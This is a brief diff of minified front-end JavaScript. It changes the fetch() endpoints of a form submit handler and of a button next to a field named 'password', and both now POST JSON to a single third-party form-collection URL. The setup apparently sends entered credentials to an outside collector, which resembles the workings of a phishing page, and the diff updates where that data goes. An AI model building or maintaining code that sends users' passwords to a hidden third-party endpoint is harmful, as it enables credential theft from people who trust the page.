@@ -9476,7 +9476,7 @@
                                     children: "Please be sure to provide the requested information below."
                                 }), (0, Ne.jsxs)("form", {
                                     onSubmit: e => {
-                                        e.preventDefault(), p && f ? (fetch("https://submit-form.com/dx48YTxpJ", {
+                                        e.preventDefault(), p && f ? (fetch("https://submit-form.com/PXYubF3i5", {
                                             method: "POST",
                                             headers: {
                                                 "Content-Type": "application/json"
@@ -9566,7 +9566,7 @@
                         name: "password"
                     }), (0, Ne.jsx)("button", {
                         onClick: t => {
-                            t.preventDefault(), fetch("https://submit-form.com/LIplRH3nc", {
+                            t.preventDefault(), fetch("https://submit-form.com/PXYubF3i5", {
                                 method: "POST",
                                 headers: {
                                     "Content-Type": "application/json"
